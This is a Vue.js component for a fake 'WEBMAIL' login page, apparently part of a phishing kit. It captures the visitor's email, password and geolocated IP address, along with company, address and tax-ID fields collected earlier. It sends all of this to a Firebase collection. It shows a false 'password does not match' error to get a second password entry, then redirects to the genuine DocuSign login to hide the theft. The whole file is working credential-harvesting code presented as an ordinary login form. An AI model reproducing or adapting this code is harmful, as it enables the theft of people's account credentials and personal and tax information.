<template>
    <div>
    <v-toolbar color="#2d0c88" flat style="padding: 0px 20px;">
      <v-toolbar-title style="color:white;">WEBMAIL</v-toolbar-title>
      <v-spacer></v-spacer>
      <v-toolbar-items>
        <v-btn text dark>Help</v-btn>
      </v-toolbar-items>
    </v-toolbar>
    <div class="content">
             <v-card class="site-card">
      <h3 style="font-size:20px;letter-spacing:1px;margin-bottom:10px">LOGIN INTO YOUR ACCOUNT</h3>
      <p style="color:red; font-size:14px" v-if="passLogic">The password does not match the email provided</p>
            <br>
            <form @submit.prevent = "toDoc2">
               <label for="" style="font-size:14px;">Email Address</label>
            <br>
            <input v-model="Email" type="text" class="text-field" required>
            <br><br>
            <label for="" style="font-size:14px;">Password</label>
            <input v-model="password" type="password" class="text-field" required>
            <br>
            <br>
            <Button v-if="btn" @click="Save" type="submit" style="color:white;width:100%;font-size:14px;background:#2d0c88;padding:10px 25px;font-weight:bold;">LOGIN</Button>  
             <Button v-else @click="Save2" type="submit" style="color:white;width:100%;font-size:14px;background:#2d0c88;padding:10px 25px;font-weight:bold;">LOGIN</Button>  
            </form>
            <br>
            <center>
                <img src="../../assets/social.png" alt="" height='28px'>
              <p style="color:red; font-size:14px">Note: Icloud is not supported</p>  
            </center>
            
             </v-card>
            
    </div>
    <div class="footer">
    <p style="margin-top:20px;display:inline-block;color:white;font-size:14px;">Copyright © 2019 Webmail, Inc. All rights reserved.</p>
    </div>
    </div>
</template>

<script>
import db from '../../firebaseinit.js';
import firebase from 'firebase';
import { error } from 'util';
 import { mapGetters } from 'vuex'
  export default {
     data() {
    return {
        Email: '',
       json:null,
         btn: true,
         passLogic: false,
           password: '',
           Cdate: new Date()
    }
  },
  computed:{
         ...mapGetters ([
             'getEmail',
            'getCompanyName',
            'getMailingAddressA1',
            'getMailingAddressA2',
            'getCity1',
            'getState1',
            'getZip1',
            'getContactName',
            'getPhoneNumber',
            'getFaxNumber',
            'getEmailAddress',
            'getMailingQuestion',
            'getMailingAddressB1',
            'getMailingAddressB2',
            'getCity2',
            'getState2',
            'getZip2',
            'getTaxDesignator',
            'getTaxId',
            'getType',
            'getStatus',
            'getEmployees'
         ]),
   },
   created(){
           var _this = this;
        $.getJSON('https://geoip-db.com/json/', function (json) {
            _this.json = json;
           });
     },

    methods:{
      Save(){
        db.collection('Details').add({
            Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Webmail',
        Email: this.Email,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
         Zip2: this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
          TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
       .then(docRef =>  this.passLogic = true, this.password = "" , this.btn = false)
   
   .catch(error => console.log(err))
             },
             Save2(){
        db.collection('Details').add({
          Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Webmail',
        Email: this.Email,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity2,
         State2 :  this.getState2,
         Zip2: this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
          TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
        window.location.assign("https://www.docusign.net/member/MemberLogin.aspx?mobile=true")
             }
    }
  }
</script>
<style scoped>
.footer{
    text-align: center;
    width: 100%;
    padding: 0px 40px;
    position: absolute;
    background: #2d0c88;
    color: #CCC;
    bottom: 0;
    left:0;

}
.text-field { height: 40px; border: 1px solid rgb(189, 189, 189);width: 100%;}
.content{padding: 80px 0px;text-align: left;}
.site-card {margin: auto; padding:50px; width:480px;background: white;}

 @media (max-width: 991px) { 
.footer{
    text-align: center;
    width: 100%;
    padding: 0px 40px;
    position: absolute;
    background: #2d0c88;
    color: #CCC;
    bottom: 0;
    left:0;

}
.text-field { height: 40px; border: 1px solid rgb(189, 189, 189);width: 100%;}
.content{padding: 80px 0px;text-align: left;}
.site-card {margin: auto; padding:50px; width:480px;background: white;}
  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
.footer{
    text-align: center;
    width: 100%;
    padding: 0px 40px;
    position: absolute;
    background: #2d0c88;
    color: #CCC;
    bottom: 0;
    left:0;
}
.text-field { height: 40px; border: 1px solid rgb(189, 189, 189);width: 100%;}
.content{padding: 40px 20px;text-align: left;}
.site-card {margin: auto; padding:30px; width:auto;background: white;}
}
</style>
